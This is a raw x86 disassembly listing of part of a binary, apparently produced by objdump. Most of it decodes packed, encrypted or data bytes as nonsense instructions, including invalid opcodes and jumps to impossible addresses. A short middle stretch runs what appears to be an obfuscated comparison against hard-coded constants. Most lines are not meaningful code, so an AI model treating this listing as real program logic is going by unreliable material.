  41b112:	pop    ds
  41b113:	pop    esp
  41b114:	int3   
  41b115:	imul   eax,esp,0xfffffffa
  41b118:	mov    es,WORD PTR [esi-0x43]
  41b11b:	dec    ebx
  41b11c:	and    DWORD PTR [edx+0x66511ba5],edx
  41b122:	mov    WORD PTR [edi-0x15],ss
  41b125:	sub    ebx,ebp
  41b127:	and    dl,dh
  41b129:	pop    ebx
  41b12a:	and    DWORD PTR [eax-0x3042203f],edx
  41b130:	push   esp
  41b131:	gs fwait
  41b133:	inc    esi
  41b134:	in     al,0x31
  41b136:	or     al,0x2a
  41b138:	mov    edx,0xe0ed1396
  41b13d:	cmp    BYTE PTR ds:0x6aaf0ce2,al
  41b143:	jo     0x41b1c0
  41b145:	mov    bl,0xf7
  41b147:	clc    
  41b148:	test   BYTE PTR [ebx],dl
  41b14a:	cmp    al,0x21
  41b14c:	in     eax,0x94
  41b14e:	les    edi,FWORD PTR [edi-0x1bc49668]
  41b154:	mov    ebp,0x47d236a2
  41b159:	daa    
  41b15a:	push   edx
  41b15b:	mov    al,0x2e
  41b15d:	scas   al,BYTE PTR es:[edi]
  41b15e:	or     al,0x18
  41b160:	fld    TBYTE PTR [eax+0x46c715cb]
  41b166:	jb     0x41b174
  41b168:	xor    esi,DWORD PTR [edi-0x2c]
  41b16b:	jmp    0x57cffb09
  41b170:	ss push 0xbebe3667
  41b176:	fbld   TBYTE PTR [esi]
  41b178:	jmp    DWORD PTR [ebx+0x5fdf5584]
  41b17e:	mov    ebx,0x28146d16
  41b183:	cmp    BYTE PTR [edx-0x72],bl
  41b186:	into   
  41b187:	pop    esp
  41b188:	sbb    DWORD PTR [esi+0x33],edi
  41b18b:	push   esi
  41b18c:	add    BYTE PTR [ecx],al
  41b18e:	lea    ecx,[edi-0x2d]
  41b191:	jbe    0x41b203
  41b193:	push   0xfffffffb
  41b195:	add    BYTE PTR [ebx-0x25],dl
  41b198:	rcl    DWORD PTR [ecx],1
  41b19a:	dec    ebp
  41b19b:	mov    di,WORD PTR [edx+0x1238f6fe]
  41b1a2:	fwait
  41b1a3:	int3   
  41b1a4:	repnz mov DWORD PTR [ecx-0x8],esp
  41b1a8:	out    dx,eax
  41b1a9:	inc    edi
  41b1aa:	push   ds
  41b1ab:	(bad)
  41b1ae:	mov    dh,0xf7
  41b1b0:	std    
  41b1b1:	mov    ebp,0xdf4d6a7e
  41b1b6:	cld    
  41b1b7:	inc    ecx
  41b1b8:	and    bl,BYTE PTR [edx-0x696a4d80]
  41b1be:	out    dx,al
  41b1bf:	in     al,dx
  41b1c0:	fcompp 
  41b1c2:	mov    edx,0xe91a2edd
  41b1c7:	pop    ecx
  41b1c8:	xor    eax,0x40a9612c
  41b1cd:	jnp    0x41b233
  41b1cf:	xlat   BYTE PTR ds:[ebx]
  41b1d0:	or     bh,ch
  41b1d2:	push   0xffffffb5
  41b1d4:	cmp    ch,ah
  41b1d6:	dec    edx
  41b1d7:	or     dl,ch
  41b1d9:	jmp    0xa2262d36
  41b1de:	and    al,0x94
  41b1e0:	mov    eax,ds:0x215573d0
  41b1e5:	jecxz  0x41b1b0
  41b1e7:	add    eax,0x6e17330d
  41b1ec:	call   0xc646:0x44cf44c2
  41b1f3:	jmp    0xb57f:0x461c13de
  41b1fa:	(bad)  
  41b1fb:	push   edx
  41b1fc:	pop    esi
  41b1fd:	das    
  41b1fe:	sbb    bl,BYTE PTR [edx]
  41b200:	shl    BYTE PTR [esi],1
  41b202:	add    BYTE PTR [edi-0x16],bl
  41b205:	cmp    DWORD PTR [ecx-0x1d],ecx
  41b208:	aaa    
  41b209:	jns    0x41b278
  41b20b:	out    0xe6,eax
  41b20d:	sub    edi,0x13
  41b210:	lods   al,BYTE PTR ds:[esi]
  41b211:	iret   
  41b212:	push   ecx
  41b213:	(bad)  
  41b214:	(bad)  
  41b215:	out    0xac,al
  41b217:	push   ss
  41b218:	ins    BYTE PTR es:[edi],dx
  41b219:	pop    ss
  41b21a:	fs dec edx
  41b21c:	test   eax,0x119f608f
  41b221:	in     al,0x95
  41b223:	adc    eax,0xb8134e7a
  41b228:	jmp    0xd49e5382
  41b22d:	add    al,0x15
  41b22f:	(bad)  
  41b230:	jle    0x41b25c
  41b232:	(bad)  
  41b233:	fld    TBYTE PTR [edx+esi*8-0x450e2f6b]
  41b23a:	pop    es
  41b23b:	cwde   
  41b23c:	and    bh,0x79
  41b23f:	test   DWORD PTR [edi+0x1a],esi
  41b242:	in     al,dx
  41b243:	fwait
  41b244:	sub    al,0x64
  41b246:	ins    BYTE PTR es:[edi],dx
  41b247:	fucomi st,st(3)
  41b249:	dec    ecx
  41b24a:	jp     0x41b236
  41b24c:	in     eax,0xf9
  41b24e:	push   ds
  41b24f:	loopne 0x41b2ca
  41b251:	mov    ebx,0x5149757c
  41b256:	dec    DWORD PTR [edx-0x5af88b5c]
  41b25c:	jae    0x41b27c
  41b25e:	ret    0xc624
  41b261:	into   
  41b262:	sbb    ecx,DWORD PTR [ebx+0x1d775496]
  41b268:	dec    edi
  41b269:	sti    
  41b26a:	inc    esi
  41b26b:	dec    edi
  41b26c:	push   esi
  41b26d:	repnz xchg ebx,eax
  41b26f:	js     0x41b1f5
  41b271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b272:	and    eax,0x58a31fe6
  41b277:	sbb    BYTE PTR [edi+ecx*4+0x5841482a],al
  41b27e:	mov    es,esi
  41b280:	add    eax,0xbdae8fa1
  41b285:	mov    edx,0x328d8973
  41b28a:	mov    ebx,0x135b4dab
  41b28f:	dec    edx
  41b290:	cmp    BYTE PTR ds:0x34d715ca,al
  41b296:	push   edx
  41b297:	(bad)  
  41b298:	mov    edx,edx
  41b29a:	in     al,dx
  41b29b:	pop    ecx
  41b29c:	mov    edx,0x484ef5eb
  41b2a1:	ins    DWORD PTR es:[edi],dx
  41b2a2:	aad    0x64
  41b2a4:	out    dx,al
  41b2a5:	cdq    
  41b2a6:	jae    0x41b305
  41b2a8:	in     eax,0xa2
  41b2aa:	shr    BYTE PTR [edx+edi*1+0x65],0xb1
  41b2af:	or     cl,BYTE PTR [ebx+0x68]
  41b2b2:	ret    0xf216
  41b2b5:	push   esi
  41b2b6:	xor    bh,cl
  41b2b8:	popf   
  41b2b9:	xor    dh,BYTE PTR [eax]
  41b2bb:	test   al,0x44
  41b2bd:	jb     0x41b26f
  41b2bf:	sbb    esi,DWORD PTR [eax]
  41b2c1:	mov    BYTE PTR [ebx+ecx*1],al
  41b2c4:	or     DWORD PTR [esi],esi
  41b2c6:	sbb    al,BYTE PTR [eax]
  41b2c8:	into   
  41b2c9:	jg     0x41b326
  41b2cb:	pushf  
  41b2cc:	dec    edi
  41b2cd:	pop    ss
  41b2ce:	dec    edx
  41b2cf:	mov    BYTE PTR [ebx],cl
  41b2d1:	sbb    bl,BYTE PTR [edi-0x6cd769bd]
  41b2d7:	sbb    al,0x62
  41b2d9:	out    0xe9,al
  41b2db:	xchg   DWORD PTR [eax*8+0x47898421],esi
  41b2e2:	mov    ds:0x92c32289,al
  41b2e7:	les    esp,FWORD PTR [ebp+0x67]
  41b2ea:	sub    bl,BYTE PTR [esi+0x20]
  41b2ed:	jle    0x41b366
  41b2ef:	sub    ebp,DWORD PTR [edx+0x6480b731]
  41b2f5:	xchg   ecx,eax
  41b2f6:	or     BYTE PTR [eax+0x635ef550],0x2
  41b2fd:	(bad)  [esp+edx*2-0x20ef5f6b]
  41b304:	mov    bl,0x2f
  41b306:	xlat   BYTE PTR ds:[ebx]
  41b307:	ins    DWORD PTR es:[edi],dx
  41b308:	and    eax,DWORD PTR ds:0x59f9a0ef
  41b30e:	pop    ebx
  41b30f:	mov    esi,0x4dce033b
  41b314:	sub    ebx,DWORD PTR [ebp-0x1b]
  41b317:	mov    bh,0xfe
  41b319:	mov    al,0x55
  41b31b:	adc    ebp,DWORD PTR [edx-0x73]
  41b31e:	xor    BYTE PTR [ebp+0x7db8aa9f],cl
  41b324:	js     0x41b38a
  41b326:	test   al,0x88
  41b328:	inc    edx
  41b329:	cmp    eax,0x51711755
  41b32e:	clc    
  41b32f:	or     BYTE PTR [ecx-0x5a4757df],0xb4
  41b336:	sub    DWORD PTR [eax+0x77953c40],ebp
  41b33c:	pushf  
  41b33d:	xor    edx,0xca79a577
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	push   ecx
  41b368:	cdq    
  41b369:	shl    DWORD PTR [eax-0x45],1
  41b36c:	(bad)  
  41b36d:	push   ss
  41b36e:	sbb    BYTE PTR [edx+edx*1-0x2560e7e8],bh
  41b375:	jmp    0x60b0:0x58dfde30
  41b37c:	stc    
  41b37d:	pushf  
  41b37e:	popf   
  41b37f:	xlat   BYTE PTR ds:[ebx]
  41b380:	mov    ecx,0xea1c9236
  41b385:	jno    0x41b307
  41b387:	popf   
  41b388:	jae    0x41b3a7
  41b38a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38b:	fld    QWORD PTR [ecx-0x1080ac49]
  41b391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b392:	jb     0x41b335
  41b394:	jp     0x41b334
  41b396:	add    ah,BYTE PTR ds:0x8c5c2050
  41b39c:	sbb    eax,0xdc56ef80
  41b3a1:	or     ch,BYTE PTR [edx-0x30]
  41b3a4:	scas   al,BYTE PTR es:[edi]
  41b3a5:	call   0x5c96a923
  41b3aa:	bound  edi,QWORD PTR [edx-0x53033cf0]
  41b3b0:	jmp    0xbf22:0x630304c9
  41b3b7:	dec    ebp
  41b3b8:	nop
  41b3b9:	rcl    DWORD PTR [edx],1
  41b3bb:	and    eax,DWORD PTR [ebx+0x42a557a7]
  41b3c1:	jno    0x41b369
  41b3c3:	mov    esi,0x27c0752b
  41b3c8:	add    DWORD PTR [ecx+ebp*8+0x1f],0xffffffe7
  41b3cd:	sahf   
  41b3ce:	fidiv  WORD PTR [edx-0x1b]
  41b3d1:	mov    ah,0xdf
  41b3d3:	ror    BYTE PTR [edi-0x32],1
  41b3d6:	push   0xe10b760
  41b3db:	push   esp
  41b3dc:	dec    ecx
  41b3dd:	mov    ?,WORD PTR [eax-0x21]
  41b3e0:	add    eax,0x6107eea7
  41b3e5:	fisttp WORD PTR [ebx+0x3b]
  41b3e8:	imul   eax,DWORD PTR [eax+0x40b80431],0x7f0c6461
  41b3f2:	fsubrp st(4),st
  41b3f4:	push   ecx
  41b3f5:	neg    DWORD PTR [edi+edx*1]
  41b3f8:	add    edi,DWORD PTR [edi]
  41b3fa:	mov    eax,0xc5068a9d
  41b3ff:	out    dx,al
  41b400:	mov    BYTE PTR [ebx-0x49],ch
  41b403:	scas   eax,DWORD PTR es:[edi]
  41b404:	fst    DWORD PTR [esi]
  41b406:	jg     0x41b410
  41b408:	je     0x41b403
  41b40a:	in     al,dx
  41b40b:	xlat   BYTE PTR ds:[ebx]
  41b40c:	jecxz  0x41b482
  41b40e:	xchg   ebx,eax
  41b40f:	scas   eax,DWORD PTR es:[edi]
  41b410:	lahf   
  41b411:	pop    edx
  41b412:	inc    ebx
  41b413:	xor    eax,0xeae464d5
  41b418:	add    DWORD PTR [ebp+0x2a5817fe],0x1d47326f
  41b422:	or     bh,BYTE PTR [ebp-0x3e]
  41b425:	or     edx,DWORD PTR [ebx]
  41b427:	cs call 0x109c:0xd405f6d4
  41b42f:	adc    cl,BYTE PTR [ecx-0x891cba3]
  41b435:	jns    0x41b3c5
  41b437:	dec    eax
  41b438:	js     0x41b40e
  41b43a:	add    DWORD PTR [esi+0x733a4ee2],esp
  41b440:	(bad)  
  41b441:	lock into 
  41b443:	test   esp,esp
  41b445:	out    0x62,al
  41b447:	jl     0x41b4b3
  41b449:	xor    bh,BYTE PTR [esi+0x29803e53]
  41b44f:	push   esi
  41b450:	inc    esp
  41b451:	and    ebp,esp
  41b453:	mov    ah,0xf3
  41b455:	leave  
  41b456:	sbb    al,0xcc
  41b458:	ins    DWORD PTR es:[edi],dx
  41b459:	mov    ebx,0xb658d85
  41b45e:	cmp    al,0x7e
  41b460:	jmp    0xaf55:0x93586c2d
  41b467:	ins    BYTE PTR es:[edi],dx
  41b468:	fdivr  QWORD PTR [edx+0x14823c57]
  41b46e:	sbb    DWORD PTR [ecx+edi*1-0x6289915b],ebp
  41b475:	pop    ebx
  41b476:	and    BYTE PTR [ebx-0x2],dl
  41b479:	dec    esp
  41b47a:	popf   
  41b47b:	push   cs
  41b47c:	push   cs
  41b47d:	scas   eax,DWORD PTR es:[edi]
  41b47e:	arpl   WORD PTR ds:0x8e36962b,cx
  41b484:	int    0xff
  41b486:	pop    edx
  41b487:	gs sub al,0x8c
  41b48a:	shl    DWORD PTR [edx+0x59],1
  41b48d:	lods   al,BYTE PTR ds:[esi]
  41b48e:	xor    BYTE PTR [ebx+ebx*1-0x58],al
  41b492:	pop    ebx
  41b493:	mov    BYTE PTR [edi-0x16d1b397],dh
  41b499:	std    
  41b49a:	inc    edx
  41b49b:	dec    edx
  41b49c:	push   esi
  41b49d:	cli    
  41b49e:	sbb    DWORD PTR [edx+esi*4-0x48c361aa],edx
  41b4a5:	ds iret 
  41b4a7:	pusha  
  41b4a8:	retf   
  41b4a9:	lea    eax,[ecx-0x69]
  41b4ac:	js     0x41b478
  41b4ae:	pushf  
  41b4af:	out    dx,al
  41b4b0:	das    
  41b4b1:	dec    esi
  41b4b2:	jl     0x41b449
  41b4b4:	ud0    esi,DWORD PTR [esi+eax*4]
  41b4b8:	lods   eax,DWORD PTR ds:[esi]
  41b4b9:	dec    esi
  41b4ba:	(bad)  
  41b4bb:	sub    DWORD PTR [edx],edi
  41b4bd:	scas   al,BYTE PTR es:[edi]
  41b4be:	ret    0xe5b1
  41b4c1:	clc    
  41b4c2:	loopne 0x41b449
  41b4c4:	jle    0x41b460
  41b4c6:	sahf   
  41b4c7:	fistp  WORD PTR [ebx]
  41b4c9:	enter  0x4f4c,0xf7
  41b4cd:	and    eax,0x956ea7e3
  41b4d2:	arpl   WORD PTR [ebp+ebp*4+0x721d19ef],bp
  41b4d9:	mov    bh,0xf0
  41b4db:	cmp    BYTE PTR [esi-0x66],bl
  41b4de:	jbe    0x41b4dd
  41b4e0:	ins    DWORD PTR es:[edi],dx
  41b4e1:	fisub  DWORD PTR [eax]
  41b4e3:	repz inc esi
  41b4e5:	mov    ebp,0xd693f45c
  41b4ea:	(bad)  
  41b4eb:	jmp    0x30a9d429
  41b4f0:	pop    ecx
  41b4f1:	pop    esp
  41b4f2:	rol    edx,0xda
  41b4f5:	sub    al,0xa0
  41b4f7:	retf   0x3798
  41b4fa:	push   ss
  41b4fb:	call   FWORD PTR [esi+0x74]
  41b4fe:	cmp    eax,0xcf9c88c2
  41b503:	js     0x41b487
  41b505:	push   0xffffffe5
  41b507:	test   eax,0x5df07f69
  41b50c:	leave  
  41b50d:	out    dx,al
  41b50e:	add    ah,0x45
  41b511:	push   ds
  41b512:	xor    bl,BYTE PTR [edx-0x62]
  41b515:	sbb    bl,BYTE PTR [edx+ecx*4]
  41b518:	bound  esp,QWORD PTR [eax]
  41b51a:	mov    dh,0xa7
  41b51c:	pand   mm0,QWORD PTR [edi-0x3]
  41b520:	(bad)  
  41b521:	ins    BYTE PTR es:[edi],dx
  41b522:	les    ecx,FWORD PTR [edx-0x5d]
  41b525:	mov    edx,0xbbc91397
  41b52a:	in     eax,dx
  41b52b:	adc    BYTE PTR [esi+0x3134b244],al
  41b531:	aas    
  41b532:	xor    DWORD PTR ds:[edi-0x14fe24ac],esp
  41b539:	out    dx,al
  41b53a:	rol    BYTE PTR [edx-0x1fba931],cl
  41b540:	sub    ah,BYTE PTR [eax-0x35]
  41b543:	shl    DWORD PTR [bx-0x283e],0xec
  41b549:	pminub mm3,QWORD PTR [edx+ecx*8+0xeb3a838]
  41b551:	out    0xc,al
  41b553:	rcr    dh,1
  41b555:	and    al,0xd
  41b557:	sbb    dl,BYTE PTR [ebx+edx*2]
  41b55a:	push   ebx
  41b55b:	pop    edi
  41b55c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b55d:	xor    DWORD PTR [ebx+0x7db950cd],ebx
  41b563:	bnd jmp 0xbab2b159
  41b569:	mov    ds:0xb38ab9f9,eax
  41b56e:	cmc    
  41b56f:	bswap  ecx
  41b571:	cli    
  41b572:	les    ebx,FWORD PTR [ebp-0x14]
  41b575:	cmp    DWORD PTR [ecx],ebp
  41b577:	movhps xmm2,QWORD PTR [ebx+0x7b8c58cb]
  41b57e:	bound  ecx,QWORD PTR [ebp+0x64]
  41b581:	mov    ah,0x57
  41b583:	sub    al,ah
  41b585:	mov    bl,0x45
  41b587:	cdq    
  41b588:	dec    ecx
  41b589:	inc    ecx
  41b58a:	rcl    BYTE PTR [esi+0x17f1cc95],0xa5
  41b591:	or     BYTE PTR [ebx-0x3c],al
  41b594:	inc    esi
  41b595:	in     al,dx
  41b596:	inc    eax
  41b597:	in     al,0x5c
  41b599:	mov    bl,0x58
  41b59b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b59d:	shl    BYTE PTR [esi-0x194bb8ab],1
  41b5a3:	mov    WORD PTR [ebx+0x2a],cs
  41b5a6:	jb     0x41b539
  41b5a8:	add    eax,0x8c7ef22b
  41b5ad:	pop    esp
  41b5ae:	cmp    BYTE PTR [eax-0x51],0xab
  41b5b2:	pop    ebp
  41b5b3:	inc    edx
  41b5b4:	(bad)  
  41b5b5:	mov    cl,0x50
  41b5b7:	pop    edi
  41b5b8:	out    dx,eax
  41b5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5ba:	sub    esp,ebx
  41b5bc:	scas   al,BYTE PTR es:[edi]
  41b5bd:	dec    edx
  41b5be:	mov    edx,0xce9675e7
  41b5c3:	ins    DWORD PTR es:[edi],dx
  41b5c4:	aaa    
  41b5c5:	out    0x48,eax
  41b5c7:	out    dx,eax
  41b5c8:	push   ecx
  41b5c9:	pop    esi
  41b5ca:	stc    
  41b5cb:	icebp  
  41b5cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5cd:	adc    bh,BYTE PTR [ecx]
  41b5cf:	enter  0xac50,0x5c
  41b5d3:	hlt    
  41b5d4:	lods   al,BYTE PTR ds:[esi]
  41b5d5:	sahf   
  41b5d6:	inc    ecx
  41b5d7:	sbb    cl,BYTE PTR [ebp+edi*4+0x50]
  41b5db:	dec    eax
  41b5dc:	pop    eax
  41b5dd:	mov    ebx,0x346e33d8
  41b5e2:	jg     0x41b56c
  41b5e4:	or     ch,BYTE PTR gs:[esi-0x7834a912]
  41b5eb:	dec    edx
  41b5ec:	ja     0x41b610
  41b5ee:	loope  0x41b584
  41b5f0:	lock mov bl,0x5f
  41b5f3:	mov    eax,ds:0x5c63f8f4
  41b5f8:	xchg   ecx,eax
  41b5f9:	dec    ebp
  41b5fa:	push   ss
  41b5fb:	jns    0x41b629
  41b5fd:	mov    ds:0x78056ea2,eax
  41b602:	push   ebx
  41b603:	scas   eax,DWORD PTR es:[edi]
  41b604:	shl    bl,1
  41b606:	cmp    edi,ebx
  41b608:	(bad)  
  41b609:	int3   
  41b60a:	or     esp,ecx
  41b60c:	inc    esp
  41b60d:	dec    edx
  41b60e:	push   ecx
  41b60f:	nop
  41b610:	pop    edx
  41b611:	inc    ebp
  41b612:	and    BYTE PTR [esi-0x3e03a172],cl
  41b618:	shl    BYTE PTR [ebp+0x7c],0xd3
  41b61c:	and    al,0x85
  41b61e:	push   edx
  41b61f:	or     eax,0x3bedc93e
  41b624:	fist   DWORD PTR [edi+0x3d111876]
  41b62a:	pop    edi
  41b62b:	arpl   WORD PTR [edi+ebx*1-0x60f68c40],ax
  41b632:	mov    ah,0xd8
  41b634:	shr    dh,1
  41b636:	mov    ss,WORD PTR [edx+0x71847f16]
  41b63c:	nop
  41b63d:	and    edx,DWORD PTR gs:[edi-0x55]
  41b641:	loope  0x41b60b
  41b643:	fdivrp st(6),st
  41b645:	in     eax,0xc9
  41b647:	out    dx,al
  41b648:	and    bh,BYTE PTR [ebp+0x5c05fdb4]
  41b64e:	dec    esi
  41b64f:	pushf  
  41b650:	fist   WORD PTR [esp+ebp*2+0x587d5bae]
  41b657:	sub    eax,0x9200f547
  41b65c:	cdq    
  41b65d:	jb     0x41b6de
  41b65f:	push   eax
  41b660:	adc    DWORD PTR fs:[edi+0x27],ecx
  41b664:	sar    BYTE PTR ds:0xf3651b4d,0x2e
  41b66b:	pop    ecx
  41b66c:	hlt    
  41b66d:	mov    esi,0x22a2ee2b
  41b672:	cli    
  41b673:	add    al,0xec
  41b675:	push   ecx
  41b676:	inc    eax
  41b677:	jecxz  0x41b6c6
  41b679:	jp     0x41b6a0
  41b67b:	(bad)  
  41b67c:	scas   al,BYTE PTR es:[edi]
  41b67d:	pop    ds
  41b67e:	dec    esi
  41b67f:	add    al,dh
  41b681:	jp     0x41b605
  41b683:	ins    DWORD PTR es:[edi],dx
  41b684:	enter  0xa33e,0x7c
  41b688:	push   cs
  41b689:	aas    
  41b68a:	add    DWORD PTR [esi],ebx
  41b68c:	mov    ds:0x61d1253d,eax
  41b691:	adc    BYTE PTR [eax+0x12],dh
  41b694:	sub    BYTE PTR [ebx+edi*1],dh
  41b697:	in     eax,0x54
  41b699:	adc    ebp,DWORD PTR [ebx-0x70]
  41b69c:	and    eax,edx
  41b69e:	mov    al,0x6c
  41b6a0:	mov    eax,0x491d8380
  41b6a5:	push   ss
  41b6a6:	or     DWORD PTR [esi-0x7e],esi
  41b6a9:	jae    0x41b68d
  41b6ab:	dec    eax
  41b6ac:	scas   al,BYTE PTR es:[edi]
  41b6ad:	inc    ebp
  41b6ae:	xlat   BYTE PTR ds:[ebx]
  41b6af:	popa   
  41b6b0:	pop    ds
  41b6b1:	aam    0xe3
  41b6b3:	add    esp,DWORD PTR [edx+ebp*4-0x1f]
  41b6b7:	rcl    DWORD PTR [edi+0x10de78e2],cl
  41b6bd:	int    0x8b
  41b6bf:	mov    eax,ds:0x4314b38d
  41b6c4:	jmp    0x6e29:0xe0e75223
  41b6cb:	sub    ebx,ecx
  41b6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6ce:	rcr    DWORD PTR [esi+0x7f],cl
  41b6d1:	mov    BYTE PTR [edi-0x617bcba0],ah
  41b6d7:	push   ebx
  41b6d8:	push   edi
  41b6d9:	or     eax,ecx
  41b6db:	push   ecx
  41b6dc:	cmp    eax,0x4d01e94b
  41b6e1:	push   ebp
  41b6e2:	adc    dl,BYTE PTR [edx+0x344c7fde]
  41b6e8:	ror    ch,cl
  41b6ea:	push   ebx
  41b6eb:	mov    ch,0xe8
  41b6ed:	mov    ch,0x87
  41b6ef:	add    al,0x94
  41b6f1:	in     al,0x4c
  41b6f3:	loope  0x41b732
  41b6f5:	mov    ds:0x41f64e9e,eax
  41b6fa:	mov    edi,ss
  41b6fc:	sub    cl,BYTE PTR [eax]
  41b6fe:	out    0xda,eax
  41b700:	out    0xdb,eax
  41b702:	aas    
  41b703:	sub    edx,DWORD PTR [edx]
  41b705:	mov    ebx,0x7cd174fd
  41b70a:	mov    esp,ebx
  41b70c:	outs   dx,BYTE PTR ds:[esi]
  41b70d:	mov    BYTE PTR [ebx+0x5e],cl
  41b710:	cwde   
  41b711:	and    eax,0xc5c3bf73
  41b716:	shl    BYTE PTR [ebp-0x7fdfa59],1
  41b71c:	sub    eax,0xed504cdc
  41b721:	add    edx,esp
  41b723:	call   0x1f2278e9
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x4225f4
  41b758:	mov    DWORD PTR [esp+0x68],0x4225ec
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42257c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx+0x2aa298c],dh
  41b815:	add    BYTE PTR [ebx+0x16895e7c],al
  41b81b:	sbb    BYTE PTR [edx+edx*1-0x43e8e7e8],bh
  41b822:	(bad)
  41b825:	dec    edx
  41b826:	(bad)  
  41b828:	fwait
  41b829:	push   eax
  41b82a:	jl     0x41b7cf
  41b82c:	call   0xfb746d9
  41b831:	xchg   ebp,eax
  41b832:	sahf   
  41b833:	fcomp  DWORD PTR [ebx-0x29]
  41b836:	out    0x28,al
  41b838:	xchg   ebp,eax
  41b839:	jp     0x41b822
  41b83b:	dec    edx
  41b83c:	test   al,0xb0
  41b83e:	add    DWORD PTR [ebp+0x3262e67],0x51
  41b845:	gs mov eax,0x64aa41bd
  41b84b:	dec    edi
  41b84c:	inc    esi
  41b84d:	mov    ds:0x797678d4,al
  41b852:	pop    edi
  41b853:	dec    edi
  41b854:	adc    DWORD PTR [ecx],esp
  41b856:	data16 mov BYTE PTR [eax-0x33856b6c],dh
  41b85d:	mov    edi,0x63d1af00
  41b862:	xchg   BYTE PTR [edx+0x58],bl
  41b865:	call   0x3d9c71c3
  41b86a:	sub    cl,BYTE PTR [eax-0x23]
  41b86d:	repnz out 0xf6,al
  41b870:	xlat   BYTE PTR ds:[ebx]
  41b871:	mov    edx,0x845bfcf9
  41b876:	dec    eax
  41b877:	sbb    ebx,DWORD PTR [esi+0x7f]
  41b87a:	xor    al,BYTE PTR [edx-0x61]
  41b87d:	add    esp,DWORD PTR [ebx+0x1a]
  41b880:	xchg   esi,eax
  41b881:	mov    dh,0x22
  41b883:	sbb    dh,BYTE PTR [ebx]
  41b885:	jle    0x41b89d
  41b887:	add    eax,0x15f2c7f4
  41b88c:	sar    BYTE PTR [eax],0xf3
  41b88f:	and    edi,0x1294caec
  41b895:	adc    BYTE PTR [ebx-0x6d18d558],dh
  41b89b:	ss fcmovnu st,st(7)
  41b89e:	sub    BYTE PTR [edx],0xbc
  41b8a1:	pop    es
  41b8a2:	hlt    
  41b8a3:	imul   esp,edi,0x1bb7b915
  41b8a9:	sub    DWORD PTR [edi+0x67],esp
  41b8ac:	pop    eax
  41b8ad:	bound  edx,QWORD PTR [esi]
  41b8af:	mov    dl,dl
  41b8b1:	imul   ebp,DWORD PTR [ecx],0x5a
  41b8b4:	xchg   edx,eax
  41b8b5:	ins    DWORD PTR es:[edi],dx
  41b8b6:	pusha  
  41b8b7:	xor    edi,DWORD PTR [esi-0x21bb08cf]
  41b8bd:	aam    0x69
  41b8bf:	jg     0x41b8d1
  41b8c1:	leave  
  41b8c2:	mov    esi,0xcdba99be
  41b8c7:	ins    BYTE PTR es:[edi],dx
  41b8c8:	mov    ebx,eax
  41b8ca:	neg    ebx
  41b8cc:	pop    edx
  41b8cd:	imul   ebp,eax,0xffffffcb
  41b8d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8d1:	int3   
  41b8d2:	mov    esi,0x22913038
  41b8d7:	inc    esp
  41b8d8:	mov    bl,0x52
  41b8da:	and    eax,0x1ea6da67
  41b8df:	push   ebx
  41b8e0:	inc    edi
  41b8e1:	push   es
  41b8e2:	hlt    
  41b8e3:	add    esi,DWORD PTR [eax]
